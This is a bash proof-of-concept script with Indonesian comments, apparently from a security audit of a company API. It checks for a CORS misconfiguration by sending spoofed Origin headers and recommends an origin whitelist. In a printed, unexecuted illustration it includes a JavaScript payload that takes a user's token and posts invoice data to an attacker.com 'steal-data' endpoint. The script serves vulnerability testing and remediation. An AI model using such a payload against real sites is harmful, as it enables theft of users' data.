#!/bin/bash
# ==============================================================
# PoC: HIGH-006 — CORS Wildcard + Credentials Demo
# ==============================================================
# Demonstrasi bahwa CORS backend mengizinkan request dari semua
# origin dengan credentials, memungkinkan CSRF-style attacks.
#
# CARA MENJALANKAN:
#   chmod +x HIGH-006-cors-demo.sh
#   ./HIGH-006-cors-demo.sh [API_BASE_URL] [JWT_TOKEN]
#
# SAFETY: Hanya menguji CORS headers. Read-only. Tidak mengubah data.
# ==============================================================

API_BASE="${1:-http://localhost:8000}"
TOKEN="${2:-YOUR_JWT_TOKEN_HERE}"
ENDPOINT="$API_BASE/api/v1/auth/me"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

separator() {
    echo ""
    echo "============================================================"
    echo "  $1"
    echo "============================================================"
}

check_cors_header() {
    local origin="$1"
    local description="$2"
    
    echo ""
    echo "  Testing Origin: $origin"
    echo "  Description   : $description"
    
    RESPONSE=$(curl -s -I \
        -H "Origin: $origin" \
        -H "Authorization: Bearer $TOKEN" \
        "$ENDPOINT" 2>&1)
    
    ALLOW_ORIGIN=$(echo "$RESPONSE" | grep -i "access-control-allow-origin" | tr -d '\r\n' | sed 's/.*: //')
    ALLOW_CREDS=$(echo "$RESPONSE" | grep -i "access-control-allow-credentials" | tr -d '\r\n' | sed 's/.*: //')
    HTTP_STATUS=$(echo "$RESPONSE" | head -1 | awk '{print $2}')
    
    echo "  HTTP Status                    : $HTTP_STATUS"
    echo "  Access-Control-Allow-Origin    : ${ALLOW_ORIGIN:-'(not present)'}"
    echo "  Access-Control-Allow-Credentials: ${ALLOW_CREDS:-'(not present)'}"
    
    # Analisis kerentanan
    if [ -n "$ALLOW_ORIGIN" ] && [ -n "$ALLOW_CREDS" ]; then
        if [ "$ALLOW_ORIGIN" = "$origin" ] || [ "$ALLOW_ORIGIN" = "*" ]; then
            echo -e "  ${RED}✗ VULNERABLE: Origin diizinkan + credentials=true${NC}"
            echo "    → Website $origin bisa baca response API dengan credentials user!"
            return 1
        fi
    elif [ -z "$ALLOW_ORIGIN" ]; then
        echo -e "  ${GREEN}✓ Origin ini diblokir oleh CORS policy${NC}"
        return 0
    fi
}

separator "HIGH-006 PoC — CORS Wildcard + Credentials Demo"
cat << 'EOF'

  SKENARIO:
  Attacker memiliki website https://attacker.com
  User KPC sedang login (punya token di localStorage atau cookie)
  
  PERTANYAAN:
  Bisakah attacker.com membuat request ke API KPC
  dan membaca responsenya menggunakan kredensial user?

  YANG DIUJI:
  Apakah server mengizinkan arbitrary origin dengan credentials?
EOF

# ──────────────────────────────────────────────
# TEST 1: Origin sah (seharusnya diizinkan)
# ──────────────────────────────────────────────
separator "TEST 1 — Origin Legitimate"
check_cors_header "https://kpc-app.kpc.co.id" "Origin resmi KPC App"

# ──────────────────────────────────────────────
# TEST 2: Origin attacker (seharusnya DIBLOKIR)
# ──────────────────────────────────────────────
separator "TEST 2 — Origin Attacker (Seharusnya Diblokir)"
check_cors_header "https://attacker-site.com" "Website attacker (bukan whitelist KPC)"

# ──────────────────────────────────────────────
# TEST 3: Origin lain yang tidak sah
# ──────────────────────────────────────────────
separator "TEST 3 — Origin Lain yang Tidak Sah"
check_cors_header "https://phishing-kpc.com" "Phishing site yang meniru nama KPC"
check_cors_header "http://localhost:9999" "Port tidak dikenal di localhost"
check_cors_header "https://evil.outsystems.app" "Subdomain outsystems yang tidak sah"

# ──────────────────────────────────────────────
# TEST 4: Preflight OPTIONS request
# ──────────────────────────────────────────────
separator "TEST 4 — Preflight OPTIONS Request"
echo ""
echo "  Simulasi browser preflight saat POST dari attacker.com..."
echo ""

PREFLIGHT=$(curl -s -I \
    -X OPTIONS \
    -H "Origin: https://attacker-site.com" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Authorization, Content-Type" \
    "$API_BASE/api/v1/auth/logout" 2>&1)

echo "  Preflight response headers:"
echo "$PREFLIGHT" | grep -i "access-control" | while read line; do
    echo "  → $line"
done

# ──────────────────────────────────────────────
# TEST 5: Simulasi CSRF scenario (no actual attack)
# ──────────────────────────────────────────────
separator "TEST 5 — Demonstrasi CSRF Scenario"
cat << 'EOF'

  SIMULASI (tidak dieksekusi — hanya untuk ilustrasi):
  
  Jika CORS mengizinkan attacker.com + credentials=true,
  HTML berikut di website attacker bisa mencuri data user:
  
  ─────────────────────────────────────────────────────────
  <!-- Di halaman attacker.com yang dibuka user KPC -->
  <script>
  fetch('https://api.kpc.co.id/api/v1/invoices', {
    method: 'GET',
    credentials: 'include',    // kirim cookie/token user
    headers: {
      'Authorization': 'Bearer ' + localStorage.getItem('token')
    }
  })
  .then(r => r.json())
  .then(data => {
    // Kirim data invoice ke server attacker
    fetch('https://attacker.com/steal-data', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
  </script>
  ─────────────────────────────────────────────────────────
  
  Dengan CORS yang benar (whitelist hanya kpc.co.id):
  → Browser akan blokir request ini
  → User aman meski membuka halaman attacker
  
  Dengan CORS wildcard (kondisi saat ini):
  → Browser mengizinkan request
  → Data invoice bocor ke server attacker
EOF

# ──────────────────────────────────────────────
# RINGKASAN
# ──────────────────────────────────────────────
separator "RINGKASAN DEMO — HIGH-006"
cat << 'EOF'

  YANG DIBUKTIKAN:
  • CORS policy backend tidak membatasi origin secara eksplisit
  • Default konfigurasi mengizinkan semua origin (wildcard)
  • Dengan credentials=True, efeknya adalah semua origin diizinkan
    menggunakan kredensial user

  DAMPAK TEKNIS:
  1. CSRF attacks dari website pihak ketiga
  2. Data reading attacks jika token di localStorage (HIGH-003)
  3. Jika migrasi ke cookie auth, CSRF menjadi jauh lebih mudah

  CARA VERIFIKASI MANUAL:
  1. Buka browser Developer Tools
  2. Pergi ke Network tab
  3. Akses API endpoint
  4. Lihat response headers: Access-Control-Allow-Origin
  5. Jika = wildcard "*" atau = reflected origin → VULNERABLE

  REKOMENDASI:
  1. Ganti default CORS_ORIGINS dari ["*"] ke list kosong []
  2. Tambahkan startup validation: error jika CORS_ORIGINS tidak di-set
  3. Set eksplisit: CORS_ORIGINS=["https://kpc-app.kpc.co.id","https://ptkpc-dev.outsystems.app"]
  4. Jangan combine allow_origins=["*"] dengan allow_credentials=True
EOF

echo ""
echo "  Script selesai."
